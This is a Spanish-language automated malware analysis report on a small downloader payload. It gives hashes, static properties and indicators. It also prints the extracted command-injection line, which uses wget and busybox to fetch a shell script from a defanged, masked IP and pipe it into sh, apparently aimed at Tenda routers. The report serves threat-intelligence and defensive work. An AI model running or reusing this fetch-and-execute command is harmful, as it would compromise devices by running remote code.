# 🧬 Payload Analysis

`2f20fa518e9f7fb8de5965c1f55d338f80b102de5cc5d0a471d809621c78a55d`

## 📌 Resumen

Artefacto identificado como ASCII text, with no line terminators de 173 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:49:46.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `2f20fa518e9f7fb8de5965c1f55d338f80b102de5cc5d0a471d809621c78a55d`
- **SHA1:** `9ea6aac5826e5e95dd952c9696d5a6c4bec1577c`
- **MD5:** `9b7e52a08128cfa721edcc3e925cf902`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with no line terminators |
| Tamaño | 173 B |
| Entropía | 4.75 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with no line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
mac=;cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s tendaac6;busybox wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s tend
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh | strings |
| ip | 91.92.40.XXX | static_analysis |
| command | mac=;cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s tendaac6;busybox wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s tend | strings |
| hash | 2f20fa518e9f7fb8de5965c1f55d338f80b102de5cc5d0a471d809621c78a55d | static_analysis |
| ip | 45.153.34.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | structured text |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
